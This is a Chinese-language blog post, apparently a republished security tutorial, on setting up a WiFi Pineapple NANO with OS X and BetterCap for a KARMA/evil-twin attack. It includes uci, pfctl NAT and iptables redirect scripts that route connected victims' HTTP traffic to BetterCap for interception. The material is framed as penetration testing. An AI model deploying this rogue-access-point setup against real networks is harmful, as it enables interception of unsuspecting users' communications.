> 原文链接: https://www.anquanke.com//post/id/84576 


# 【技术分享】使用Pineapple NANO、OS X和BetterCap进行无线网络渗透测试


                                阅读量   
                                **92177**
                            
                        |
                        
                                                                                    



**前言**

经过实地测试，我发现了使用WiFi Pineapple NANO、OS X笔记本电脑以及 BetterCap（一款完整，模块化，轻量级，易扩展的中间人攻击测试工具和框架）进行无线网络渗透测试的完善配置。由于不同的人使用不同的平台而使得这项工作存在一定的问题（主要是OS X和BetterCap之间网络连接共享困难的问题）。下面我将分享我的设置。

[![](https://p0.ssl.qhimg.com/t01074038c18a2b70f3.jpg)](http://www.mottoin.com/89259.html/1-224)

**<br>**

**WiFi Pineapple AKA KARMA攻击**

首先，让我先讲解一下KARMA攻击。[DigiNinja](https://digi.ninja/karma/)是这样介绍KARMA的：

**KARMA是一组补丁接入点软件，让它响应探测请求；这不仅仅是它本身同时也是对所有ESSID请求。这允许AP作为一个诱饵来吸引任何客户端探测已知的网络。最初的Karma补丁是著名安全研究员Dino Dai Zovi针对Madwifi（Multiband Atheros Driver for Wifi）而发布的。然后由我接管，将补丁移植到Madwifi-ng上，现在已经采取了新的hostapd。**

长话短说，在每个WIfi接入点都运行着hostapd，用来接收附近客户端（笔记本、手机等）的探测，并且唯一给探测回应的是发送它的SSID，其他的都丢弃。

有人创建了一个hostapd二进制补丁版本，该版本不是接受每一个探头。这样的结果是一个WiFi接入点，假装是（例如）您的家庭网络，从而迫使附近的设备自动连接到它。你可以通过kali分配，正确的驱动以及硬件等创建一个”Evil Twin”这样的AP，或者你也可以使用一个廉价的TPLINK wr703n，最简单最快速的解决方法是购买一个WiFi Pineapple。对于我来说，我有一个MKV、Tetra以及NANO，在文章中将重点谈论后者。

**<br>**

**与OS X的网络连接共享**

在你完成基本的NANO配置之后，运行你的设备，IP地址为172.16.42.1为了从你的Mac wifi适配器共享连接给NANO（插到Mac的USB接口上），你需要改变一下IP地址，使得该IP地址被ICS OS X机制所接受。

```
ssh root@172.16.42.1
uci set network.lan.ipaddr='192.168.2.10'
uci set network.lan.gateway='192.168.2.1'
uci commit &amp;amp;&amp;amp; reboot
```

然后你就可以从你的Mac WiFi适配器共享网络连接给NANO USB-Eth适配器：

[![](https://p3.ssl.qhimg.com/t015e01d33c4c1797d7.png)](https://p3.ssl.qhimg.com/t015e01d33c4c1797d7.png)

最终，您将需要为接口配置一个静态IP地址：

[![](https://p2.ssl.qhimg.com/t015e01d33c4c1797d7.png)](http://www.mottoin.com/89259.html/ip)

到这一步就差不多了，你需要在你的Mac上配置正确的防火墙规则，使两接口之间一切工作正常，下面是我写的一个脚本（NANO的以太网接口是en4，根据你的需求更改）：

```
#!/bin/bash
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root." 1&amp;gt;&amp;amp;2
   exit 1
fi
sysctl -w net.inet.ip.forwarding=1
pfctl -e
echo "nat on en0 from en4:network to any -&amp;gt; (en0)" | pfctl -f -
```

在你启动了它之后，你可以通过ssh登录你的NANO来验证网络共享是否在工作。

[![](https://p0.ssl.qhimg.com/t01bedfff1a7b7fa5ed.png)](http://www.mottoin.com/89259.html/ics_working)

最后，通常会配置并启动PineAP：

[![](https://p5.ssl.qhimg.com/t011e16e2385fe9bf25.png)](http://www.mottoin.com/89259.html/pineap)

现在你就可以运行你的KARMA攻击了，附近有WiFi功能的设备应该很快就会连接到你的AP。

**<br>**

**端口重定向和Bettercap**

不幸的是，让bettercap运行在NANO上是一件非常痛苦的事情，即使你设法做到。它的硬件根本不够强大，无法正确运行它，使它同时处理多个连接。所以我决定在笔记本电脑上运行它，然后NANO重定向所有的HTTP（以及可选的HTTPS）连接到它上面。

下面是一个简单的bash脚本，你需要复制到你的NANO上，它会启用或禁用端口重定向到你的笔记本电脑上运行bettercap上：

[](http://www.mottoin.com/89259.html/setup)

```
#!/bin/bash
if [[ $# -eq 0 ]] ; then
    echo "Usage: $0 (enable|disable)"
    exit 1
fi
action="$1"
case $action in
    enable)
      echo "Enabling ..."
      iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080
      iptables -t nat -A POSTROUTING -j MASQUERADE
    ;;
    disable)
      echo "Disabling ..."
      iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080
    ;;
    *)
      echo "Usage: $0 (enable|disable)"
      exit 1
    ;;
esac
```



一旦您启用了端口重定向，你可以在你的电脑上通过命令行简单的启动bettercap，开始拦截被迫连接到你恶意接入点的目标客户端的通信。

[<br>![](https://p2.ssl.qhimg.com/t010a393609dfb446e8.jpg)](http://www.mottoin.com/89259.html/setup)
